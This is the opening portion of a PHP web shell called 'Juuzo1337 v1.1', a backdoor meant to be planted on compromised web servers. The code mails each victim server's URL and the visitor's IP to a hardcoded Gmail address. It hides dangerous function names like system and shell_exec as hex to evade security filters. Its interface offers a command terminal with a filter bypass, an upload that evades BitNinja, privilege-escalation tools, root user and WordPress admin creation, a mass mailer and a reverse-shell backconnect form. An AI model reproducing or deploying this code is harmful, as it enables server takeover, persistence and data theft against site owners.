<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$destinationmail = 'panteqcrew@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$mail_alert = "Bug $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($destinationmail, "MD", $mail_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
# function WAF

$Array = [
    '676574637764', # ge  tcw d => 0
    '676c6f62', # gl ob => 1
    '69735f646972', # is_d ir => 2
    '69735f66696c65', # is_ file => 3
    '69735f7772697461626c65', # is_wr iteable => 4
    '69735f7265616461626c65', # is_re adble => 5
    '66696c657065726d73', # fileper ms => 6
    '66696c65', # f ile => 7
    '7068705f756e616d65', # php_unam e => 8
    '6765745f63757272656e745f75736572', # getc urrentuser => 9
    '68746d6c7370656369616c6368617273', # html special => 10
    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
    '6d6b646972', # mk dir => 12
    '746f756368', # to uch => 13
    '6368646972', # ch dir => 14
    '72656e616d65', # ren ame => 15
    '65786563', # exe c => 16
    '7061737374687275', # pas sthru => 17
    '73797374656d', # syst em => 18
    '7368656c6c5f65786563', # sh ell_exec => 19
    '706f70656e', # p open => 20
    '70636c6f7365', # pcl ose => 21
    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
    '70726f635f6f70656e', # p roc_open => 23
    '756e6c696e6b', # un link => 24
    '726d646972', # rmd ir => 25
    '666f70656e', # fop en => 26
    '66636c6f7365', # fcl ose => 27
    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
    '63686d6f64', # ch mod => 30
    '7379735f6765745f74656d705f646972', # temp _dir => 31
    '6261736536345F6465636F6465', # => bas e6 4 _decode => 32
    '6261736536345F656E636F6465', # => ba se6 4_ encode => 33
    '636f7079' # co py => 34
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = unx($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function file_ext($file)
{
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
        return '<i class="fa-regular fa-image" style="color:#09e3a5"></i>';
    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
        return '<i class="fa-solid fa-file-code" style="color:#0985e3"></i>';
    } else if (mime_content_type($file) == 'text/javascript') {
        return '<i class="fa-brands fa-square-js"></i>';
    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
        return '<i class="fa-solid fa-file-zipper" style="color:#e39a09"></i>';
    } else if (mime_content_type($file) == 'text/plain') {
        return '<i class="fa-solid fa-file" style="color:#edf7f5"></i>';
    } else if (mime_content_type($file) == 'application/pdf') {
        return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
    } else {
        return '<i class="fa-regular fa-file-code" style="color:#0985e3"></i>';
    }
}

function download($file)
{

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

if ($_GET['don'] == true) {
    $FilesDon = download(unx($_GET['don']));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>Juuzo1337 [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&display=swap');
        
        :root {
            --primary: #1e293b;
            --secondary: #0f172a;
            --accent: #7c3aed;
            --text: #e2e8f0;
            --highlight: #a78bfa;
        }
        
        body {
            font-family: 'Fira Code', monospace;
            background-color: var(--secondary);
            color: var(--text);
            margin: 0;
            padding: 0;
            overflow-x: hidden;
        }
        
        .glass-effect {
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .sidebar {
            width: 280px;
            transition: all 0.3s;
        }
        
        .main-content {
            margin-left: 280px;
            transition: all 0.3s;
        }
        
        .file-icon {
            transition: all 0.2s;
        }
        
        .file-icon:hover {
            transform: scale(1.1);
        }
        
        .nav-link {
            transition: all 0.2s;
            border-left: 3px solid transparent;
        }
        
        .nav-link:hover {
            background: rgba(124, 58, 237, 0.1);
            border-left: 3px solid var(--accent);
        }
        
        .nav-link.active {
            background: rgba(124, 58, 237, 0.2);
            border-left: 3px solid var(--accent);
        }
        
        .badge {
            background: #830000;
            color: white;
            font-size: 0.7rem;
            padding: 2px 6px;
            border-radius: 4px;
        }
        
        .file-item:hover {
            background: rgba(124, 58, 237, 0.1);
        }
        
        .action-btn {
            transition: all 0.2s;
            opacity: 0;
        }
        
        .file-item:hover .action-btn {
            opacity: 1;
        }
        
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: var(--secondary);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--accent);
            border-radius: 4px;
        }
        
        .CodeMirror {
            height: 70vh;
            font-family: 'Fira Code', monospace !important;
            font-size: 14px;
        }
        
        .terminal-output {
            font-family: 'Fira Code', monospace;
            background: #0f172a;
            color: #a5b4fc;
        }
        
        .terminal-input {
            font-family: 'Fira Code', monospace;
            background: #0f172a;
            color: #a5b4fc;
            caret-color: #a5b4fc;
        }
        
        .path-breadcrumb {
            font-family: 'Fira Code', monospace;
        }
        
        .file-type-icon {
            width: 24px;
            height: 24px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-right: 8px;
        }

        /* Colorful icon classes */
        .icon-blue { color: #3b82f6; }
        .icon-green { color: #10b981; }
        .icon-red { color: #ef4444; }
        .icon-yellow { color: #f59e0b; }
        .icon-purple { color: #8b5cf6; }
        .icon-pink { color: #ec4899; }
        .icon-indigo { color: #6366f1; }
        .icon-orange { color: #f97316; }
        .icon-teal { color: #14b8a6; }
        .icon-cyan { color: #06b6d4; }

        /* Mobile styles */
        @media (max-width: 768px) {
            .sidebar {
                width: 100%;
                position: fixed;
                height: auto;
                bottom: 0;
                left: 0;
                z-index: 50;
                transform: translateY(calc(100% - 56px));
                transition: transform 0.3s ease;
            }
            
            .sidebar.active {
                transform: translateY(0);
            }
            
            .main-content {
                margin-left: 0;
                margin-bottom: 56px;
            }
            
            .sidebar-toggle {
    display: flex;
    position: fixed;
    top: 0; 
    left: 0;
    width: 100%;
    height: 42px;
    background: rgba(15, 23, 42, 0.9); 
    z-index: 60;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    backdrop-filter: blur(8px); 
    box-shadow: 0 2px 8px rgba(0,0,0,0.3); 
}

            
            .file-manager-grid {
                grid-template-columns: 1fr !important;
            }
            
            .file-item {
        grid-template-columns: repeat(12, 1fr) !important;
        gap: 0;
    }
            
            .file-info {
                display: flex;
                align-items: center;
            }
            
            .file-actions {
                display: flex;
                justify-content: flex-end;
                gap: 8px;
            }
            
            .modal {
                padding: 0 16px;
            }
            
            .modal-content {
                width: 100% !important;
                max-width: 100% !important;
            }
            
            .path-breadcrumb {
                overflow-x: auto;
                white-space: nowrap;
                padding: 8px 0;
            }
            
            .server-info {
                grid-template-columns: 1fr 1fr !important;
                gap: 8px;
            }
        }
        
        /* Dark mode toggle */
        .dark-mode-toggle {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 100;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: var(--accent);
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="sidebar-toggle md:hidden flex items-center justify-center">
        <i class="fas fa-bars text-white text-xl"></i>
        <span class="ml-2 text-white">Menu</span>
    </div>
    
    <div class="flex h-screen overflow-hidden">
        <div class="sidebar glass-effect h-full fixed left-0 top-0 overflow-y-auto">
            <div class="p-4">
             <div class="flex items-center justify-between mb-6 md:flex hidden">
               <div class="flex items-center">
                  <i class="fas fa-spider text-red-500 text-2xl mr-2"></i>
                  <h1 class="text-xl font-bold">Juuzo1337 v1.1</h1>
              </div>
              <button class="close-sidebar md:hidden text-gray-400 hover:text-white">
              <i class="fas fa-times"></i>
              </button>
           </div>

                
                <div>
                    <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2">Quick Actions</h3>
                    <div class="flex items-center flex-wrap gap-2">
                        <a href="" id="create_folder" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm flex items-center">
                            <i class="fas fa-folder-plus mr-1"></i> Folder
                        </a>
                        <a href="" id="create_file" class="bg-green-600 hover:bg-green-700 text-white px-3 py-1 rounded text-sm flex items-center">
                            <i class="fas fa-file-circle-plus mr-1"></i> File
                        </a>
                    </div>
                    <br>
                    <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2">Normal Upload</h3>
                    <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>' class="mb-6">
                        <div class="flex items-center flex-wrap gap-2">
                          <input type="file" name="Juuzo1337-upload" class="hidden" id="file-upload">
                          <label for="file-upload" class="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-sm flex items-center">
                          <i class="fas fa-upload mr-2"></i> Upload
                          </label>
                          <button type="submit" name="Juuzo1337-up-submit" class="bg-teal-600 hover:bg-teal-700 text-white px-3 py-1 rounded text-sm flex items-center">
                            <i class="fas fa-check mr-2"></i> Submit
                          </button>
                       </div>
                    </form>
                    <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2">Bitninja Bypass Upload</h3>
                    <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>' class="mb-6">
                        <div class="flex items-center flex-wrap gap-2">
                          <input type="file" name="bitninja-upload" class="hidden" id="file-uploads">
                          <label for="file-uploads" class="bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-sm flex items-center">
                          <i class="fas fa-upload mr-2"></i> Upload
                          </label>
                          <button type="submit" name="bitninja-up-submit" class="bg-teal-600 hover:bg-teal-700 text-white px-3 py-1 rounded text-sm flex items-center">
                            <i class="fas fa-check mr-2"></i> Submit
                          </button>
                       </div>
                    </form>
                </div>
                
                <div class="mb-4">
                    <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2">Tools</h3>
                    <ul>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-terminal icon-green mr-3"></i>
                                <span>Terminal</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&terminal=chankro" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-terminal icon-green mr-3"></i>
                                <span>Terminal Bypass</span>
                                <span class="badge ml-auto text-green">TOP</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&scan=suid" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                            <i class="fas fa-search text-cyan-400 text-xl mr-3"></i>
                            <span>Scanner SUID</span>
                                <span class="badge ml-auto text-green">TOP</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-user-shield icon-red mr-3"></i>
                                <span>Auto Root</span>
                                <span class="badge ml-auto">ROOT</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-database icon-blue mr-3"></i>
                                <span>Adminer</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-ghost icon-purple mr-3"></i>
                                <span>Backdoor Destroyer</span>
                            </a>
                        </li>
                        <li>
                            <a href="//www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-flask icon-orange mr-3"></i>
                                <span>Linux Exploit</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fab fa-linux icon-yellow mr-3"></i>
                                <span>Lock Shell</span>
                            </a>
                        </li>
                        <li>
                            <a href="" id="lock-file" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-lock icon-red mr-3"></i>
                                <span>Lock File</span>
                            </a>
                        </li>
                        <li>
                            <a href="" id="root-user" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-user-plus icon-green mr-3"></i>
                                <span>Create User</span>
                                <span class="badge ml-auto">ROOT</span>
                            </a>
                        </li>
                        <li>
                            <a href="" id="create-rdp" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-laptop-code icon-blue mr-3"></i>
                                <span>Create RDP</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-envelope icon-pink mr-3"></i>
                                <span>PHP Mailer</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-user-secret icon-purple mr-3"></i>
                                <span>Backconnect</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-unlock icon-green mr-3"></i>
                                <span>Unlock Shell</span>
                            </a>
                        </li>
                        <li>
                            <a href="//hashes.com/en/tools/hash_identifier" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fas fa-code icon-cyan mr-3"></i>
                                <span>Hash Identifier</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fab fa-cpanel icon-orange mr-3"></i>
                                <span>CPanel Reset</span>
                            </a>
                        </li>
                        <li>
                            <a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="nav-link flex items-center px-3 py-2 text-sm rounded-lg mb-1">
                                <i class="fab fa-wordpress icon-blue mr-3"></i>
                                <span>Create WP User</span>
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        <?php
$file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
$get_cwd = $fungsi[0]();
?>

        <div class="main-content flex-1 overflow-auto">
            <div class="p-6">
                <div class="glass-effect rounded-lg p-4 mb-6">
                    <div class="flex items-center mb-3">
                        <i class="fas fa-server icon-blue mr-2"></i>
                        <span class="text-sm"><?= $fungsi[8](); ?></span>
                    </div>
                    <div class="flex items-center mb-3">
                        <i class="fas fa-globe icon-green mr-2"></i>
                        <span class="text-sm"><?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></span>
                    </div>
                    <div class="flex items-center mb-3">
                        <i class="fas fa-network-wired icon-purple mr-2"></i>
                        <span class="text-sm"><?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?></span>
                    </div>
                    <div class="flex items-center mb-3">
                        <i class="fas fa-user icon-yellow mr-2"></i>
                        <span class="text-sm"><?= $fungsi[9](); ?></span>
                    </div>
                    <div class="flex items-center">
                        <i class="fab fa-php icon-pink mr-2"></i>
                        <span class="text-sm">PHP <?= PHP_VERSION; ?></span>
                    </div>
                </div>
                
                <div class="path-breadcrumb glass-effect rounded-lg p-3 mb-4 flex items-center flex-wrap">
                    <?php
                    $cwd = str_replace("\\", "/", $get_cwd);
                    $pwd = explode("/", $cwd);
                    if (stristr(PHP_OS, "WIN")) {
                        windowsDriver();
                    }
                    foreach ($pwd as $id => $val) {
                        if ($val == '' && $id == 0) {
                            echo '<a href="?d=' . hx('/') . '" class="flex items-center text-blue-400 hover:text-blue-300 mr-2">
                                    <i class="fas fa-home mr-1"></i> /
                                  </a>';
                            continue;
                        }
                        if ($val == '') continue;
                        echo '<span class="text-gray-400 mr-2">/</span>';
                        echo '<a href="?d=';
                        for ($i = 0; $i <= $id; $i++) {
                            echo hx($pwd[$i]);
                            if ($i != $id) echo hx("/");
                        }
                        echo '" class="text-green-400 hover:text-green-300 mr-2">' . $val . '</a>';
                    }
                    ?>
                    <a href='?d=<?= hx(__DIR__) ?>' class="ml-auto bg-indigo-600 hover:bg-indigo-700 text-white px-3 py-1 rounded text-sm flex items-center">
                        <i class="fas fa-home mr-1"></i> Home
                    </a>
                </div>
                
                <div class="glass-effect rounded-lg overflow-hidden">
    <div class="hidden md:grid grid-cols-12 bg-slate-800 p-3 font-medium">
        <div class="col-span-6 flex items-center">
            <input type="checkbox" id="select-all" class="mr-3">
            <span>Name</span>
        </div>
        <div class="col-span-2 text-center">Size</div>
        <div class="col-span-2 text-center">Permissions</div>
        <div class="col-span-2 text-center">Actions</div>
    </div>

    <form action="" method="post">
        <div class="max-h-[60vh] overflow-y-auto">
            <?php foreach ($file_manager as $_D) : ?>
                <?php if ($fungsi[2]($_D)) : ?>
                    <div class="file-item grid grid-cols-1 md:grid-cols-12 p-3 border-b border-slate-700 hover:bg-slate-800/50 gap-2">
                        <div class="col-span-6 flex items-start md:items-center">
                            <input type="checkbox" name="check[]" value="<?= $_D ?>" class="mr-3 mt-1 md:mt-0">
                            <div class="text-yellow-400 mr-2"><i class="fas fa-folder"></i></div>
                            <div class="flex flex-col">
                                <a href="?d=<?= hx($fungsi[0]() . '/' . $_D); ?>" class="text-blue-300 hover:text-blue-200 truncate">
                                    <?= namaPanjang($_D); ?>
                                </a>
                                <div class="md:hidden text-sm text-gray-400 flex flex-wrap gap-3 mt-1">
                                    <span class="text-orange-300">[DIR]</span>
                                    <span class="text-green-400"><?= perms($fungsi[0]() . '/' . $_D); ?></span>
                                </div>
                            </div>
                        </div>

                        <div class="hidden md:flex col-span-2 justify-center items-center text-orange-300 text-sm">
                            [DIR]
                        </div>

                        <div class="hidden md:flex col-span-2 justify-center items-center text-green-400 text-sm">
                            <?= perms($fungsi[0]() . '/' . $_D); ?>
                        </div>

                        <div class="col-span-2 flex justify-center items-center space-x-2">
                            <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="text-blue-400 hover:text-blue-300" title="Rename">
                                <i class="fas fa-pen-to-square"></i>
                            </a>
                            <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="text-yellow-400 hover:text-yellow-300" title="Chmod">
                                <i class="fas fa-user-lock"></i>
                            </a>
                        </div>
                    </div>
                <?php endif; ?>
            <?php endforeach; ?>

            <?php foreach ($file_manager as $_F) : ?>
                <?php if ($fungsi[3]($_F)) : ?>
                    <div class="file-item grid grid-cols-1 md:grid-cols-12 p-3 border-b border-slate-700 hover:bg-slate-800/50 gap-2">
                        <div class="col-span-6 flex items-start md:items-center">
                            <input type="checkbox" name="check[]" value="<?= $_F ?>" class="mr-3 mt-1 md:mt-0">
                            <div class="mr-2"><?= file_ext($_F) ?></div>
                            <div class="flex flex-col">
                                <a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="text-green-300 hover:text-green-200 truncate">
                                    <?= namaPanjang($_F); ?>
                                </a>
                                <div class="md:hidden text-sm text-gray-400 flex flex-wrap gap-3 mt-1">
                                    <span class="text-orange-300"><?= formatSize(filesize($_F)); ?></span>
                                    <span class="<?= is_writable($fungsi[0]() . '/' . $_F) ? 'text-green-400' : 'text-red-400' ?>">
                                        <?= perms($fungsi[0]() . '/' . $_F); ?>
                                    </span>
                                </div>
                            </div>
                        </div>

                        <div class="hidden md:flex col-span-2 justify-center items-center text-orange-300 text-sm">
                            <?= formatSize(filesize($_F)); ?>
                        </div>

                        <div class="hidden md:flex col-span-2 justify-center items-center text-sm <?= is_writable($fungsi[0]() . '/' . $_F) ? 'text-green-400' : 'text-red-400' ?>">
                            <?= perms($fungsi[0]() . '/' . $_F); ?>
                        </div>

                        <div class="col-span-2 flex justify-center items-center space-x-2">
                            <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="text-blue-400 hover:text-blue-300" title="Rename">
                                <i class="fas fa-pen-to-square"></i>
                            </a>
                            <a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="text-yellow-400 hover:text-yellow-300" title="Chmod">
                                <i class="fas fa-user-lock"></i>
                            </a>
                            <a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="text-green-400 hover:text-green-300" title="Download">
                                <i class="fas fa-download"></i>
                            </a>
                        </div>
                    </div>
                <?php endif; ?>
            <?php endforeach; ?>
        </div>

        <div class="bg-slate-800 p-3 flex flex-wrap gap-3">
            <select name="Juuzo1337-select" class="bg-slate-700 text-white rounded px-3 py-1 text-sm flex-1 md:flex-none">
                <option value="delete">Delete</option>
                <option value="unzip">Unzip</option>
                <option value="zip">Zip</option>
            </select>
            <button type="submit" name="submit-action" class="bg-purple-600 hover:bg-purple-700 text-white px-4 py-1 rounded text-sm flex items-center flex-1 md:flex-none justify-center">
                <i class="fas fa-play mr-1"></i> Execute
            </button>
        </div>
    </form>
</div>

            </div>
        </div>
    </div>


    <?php if (isset($_GET['cpanelreset'])) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold">:: Cpanel Reset</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="text-gray-400 hover:text-white">&times;</a>
                </div>
                <form action="" method="post">
                    <input type="email" name="resetcp" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-4" placeholder="Your email : example@mail.com">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submit" class="bg-orange-600 hover:bg-orange-700 text-white px-4 py-2 rounded">Submit</button>
                        <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if (isset($_GET['createwp'])) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold text-center">CREATE WORDPRESS ADMIN PASSWORD</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="text-gray-400 hover:text-white">&times;</a>
                </div>
                <form action="" method="post">
                    <input type="text" name="db_name" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="DB_NAME">
                    <input type="text" name="db_user" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="DB_USER">
                    <input type="text" name="db_password" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="DB_PASSWORD">
                    <input type="text" name="db_host" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="DB_HOST" value="127.0.0.1">
                    <hr class="border-slate-600 my-3">
                    <input type="text" name="wp_user" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="Your Username">
                    <input type="text" name="wp_pass" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="Your Password">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submitwp" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded">Submit</button>
                        <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold">:: Backconnect</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="text-gray-400 hover:text-white">&times;</a>
                </div>
                <form action="" method="post">
                    <select name="Juuzo1337-bc" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3">
                        <option value="-">Choose Backconnect</option>
                        <option value="perl">Perl</option>
                        <option value="python">Python</option>
                        <option value="ruby">Ruby</option>
                        <option value="bash">Bash</option>
                        <option value="php">php</option>
                        <option value="nc">nc</option>
                        <option value="sh">sh</option>
                        <option value="xterm">Xterm</option>
                        <option value="golang">Golang</option>
                    </select>
                    <input type="text" name="backconnect-host" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="127.0.0.1">
                    <input type="number" name="backconnect-port" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="1337">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submit-bc" class="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded">Submit</button>
                        <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if (isset($_GET['mailer'])) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-md p-6 modal-content">
                <div class="flex items-center justify-between mb-4">
                    <h3 class="text-lg font-bold">:: PHP Mailer</h3>
                    <a href="?d=<?= hx($fungsi[0]()) ?>" class="text-gray-400 hover:text-white">&times;</a>
                </div>
                <form action="" method="post">
                    <textarea name="message-smtp" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3 h-24" placeholder="Your Text here!"></textarea>
                    <input type="text" name="mailto-subject" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="Subject">
                    <input type="email" name="mail-from-smtp" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="from : example@mail.com">
                    <input type="email" name="mail-to-smtp" class="w-full bg-slate-700 text-white rounded px-3 py-2 mb-3" placeholder="to : example@mail.com">
                    <div class="flex justify-end space-x-2">
                        <button type="submit" name="submit" class="bg-pink-600 hover:bg-pink-700 text-white px-4 py-2 rounded">Submit</button>
                        <a href="?d=<?= hx($fungsi[0]()) ?>" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-2 rounded">Close</a>
                    </div>
                </form>
            </div>
        </div>
    <?php endif; ?>
    
    <?php if ($_GET['f']) : ?>
        <div class="modal fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
            <div class="glass-effect rounded-lg w-full max-w-6xl h-[80vh] flex flex-col modal-content">
